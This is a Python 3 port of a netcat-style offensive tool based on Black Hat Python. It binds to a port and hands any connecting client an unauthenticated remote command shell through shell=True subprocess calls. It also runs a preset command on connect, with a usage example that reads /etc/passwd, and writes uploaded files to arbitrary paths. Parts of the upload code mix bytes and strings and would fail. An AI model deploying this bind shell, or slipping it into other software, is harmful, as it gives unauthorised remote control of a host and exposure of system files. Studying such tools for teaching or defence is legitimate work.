#
# Based on sample code from Black Hat Python (Justin Seitz, 2015)
# Fixed some stuff and updated for Python 3
#

import getopt
import socket
import sys
import subprocess
import threading
import traceback

listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

debug = False

def usage():
    print("[INFO] Net Tool >,<")
    print()
    print("[INFO] Usage: nettool.py -t target_host -p port")
    print("[INFO] -l --listen                  - listen on [host]:[port] for incoming connections")
    print("[INFO] -e --execute=file_to_run     - execute the given file upon receiving a connection")
    print("[INFO] -c --command                 - initialize a command shell")
    print("[INFO] -c --upload_destination      - upon receiving connection upload a file and write to [destination]")
    print("[INFO] -c --debug                   - enable debug logging")
    print()
    print()
    print("[INFO] Examples: ")
    print("       nettool.py -t 127.0.0.1 -p 5555 -l -c")
    print("       nettool.py  -t 127.0.0.1 -p 5555 -l -u=/home/scripts/target.exe")
    print("       nettool.py  -t 127.0.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("       echo 'ABCDEFG' | ./nettool.py -t 127.0.0.1 -p 5555")
    sys.exit(0)

# send the data to the target over tcp
def client_sender(buffer):

    global debug

    if debug : print("[DEBUG] entered the client_sender function")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        if debug : print("[DEBUG] Attempting connection to target " + target + ":" + str(port))
        client.connect((target, port))

        # send data
        if len(buffer) > 0:
            if debug : print("[DEBUG] sending data from buffer: " + buffer)
            client.send(buffer.encode())
        
        # wait for response, read it until there's nothing left, prompt for input again, send again, loop!
        while True:

            recv_len = 1
            response = bytearray()

            while recv_len:

                if debug : print("[DEBUG] reading data, current segment length: " + str(recv_len))

                data = client.recv(4096)
                if debug : print("[DEBUG] response segment: " + data.decode())
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            
            print(response.decode())

            buffer = input("")
            buffer += "\n"
            #buffer = sys.stdin.read()

            client.send(buffer.encode())
    
    except Exception as e:

        print("[ERROR] Exception! :( Exiting...")
        print("[ERROR] Exception type: " + str(e.__class__))
        traceback.print_exc()

        client.close()

def handle_client(client_socket):

    global listen
    global port
    global upload_destination
    global execute
    global command

    global debug
    
    if debug : print("[DEBUG] entered into handle_client function")
    
    # are we uploading a file?
    if len(upload_destination):

        if debug : print("[DEBUG] entered handle_client function's upload sub")

        file_buffer = ""

        # read the file from the network connection
        while True:
            data = client_socket.recv(1024)
            # break out of while loop when there's none left
            if not data:
                break
            else:
                file_buffer += data
        
        # we're finished reading - now write them to disk
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("[INFO] Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("[INFO] Failed to save file to %s\r\n" % upload_destination)
    
    # are we executing a command?
    if len(execute):

        if debug : print("[DEBUG] entered handle_client function's execute sub")

        output = run_command(execute)

        client_socket.send(output)

    # did we request a command shell? if so enter a loop
    if command:

        if debug : print("[DEBUG] entered handle_client function's command sub")

        while True:

            # receive until we get a line feed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            if debug : print("[DEBUG] read command buffer value: " + cmd_buffer)
            
            # send back the ouput
            response = run_command(cmd_buffer)
            if debug : print("[DEBUG] got response from run_command function: " + response.decode())

            # send back the response
            client_socket.send(response)

            # show a prompt
            client_socket.send("<CMD:#> ".encode())
            



def server_loop():

    global target

    global debug

    if debug : print("[DEBUG] entered server_loop function")

    if not len(target) > 0:
        target = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(10)

    while True:

        client_socket, addr = server.accept()

        if debug : print("[DEBUG] Accepted connection from " + addr[0] + ":" + str(addr[1]))

        client_thread = threading.Thread(target=handle_client,args=(client_socket,))
        client_thread.start()

def run_command(command):

    global debug

    if debug : print("[DEBUG] entered run_command function")

    command = command.rstrip()

    try:
        if debug : print("[DEBUG] about to run command: " + command)
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "[ERROR] failed to execute command: " + command + "\r\n".encode()
    
    return output

def main():

    global listen
    global port
    global upload_destination
    global execute
    global command
    global target

    global debug
    
    # if there's no args given then run the usage info command
    if not len(sys.argv[1:]):
        usage()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:dcu:", ["debug", "help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-d", "--debug"):
            print("[DEBUG] enabled debug mode")
            debug = True
    
    # if we're not setting up a listener, then read the buffer and free it up
    if not listen and len(target) and port > 0:

        if debug : print("[DEBUG] About to read first input...")

        # read from cmdline
        buffer = sys.stdin.read()

        if debug : print("[DEBUG] Read first input (" + buffer + "), sending it to the client_sender function")

        # send data off
        client_sender(buffer)

    # if we're listening, stick the process into it's server loop
    if listen:
        
        server_loop()

main()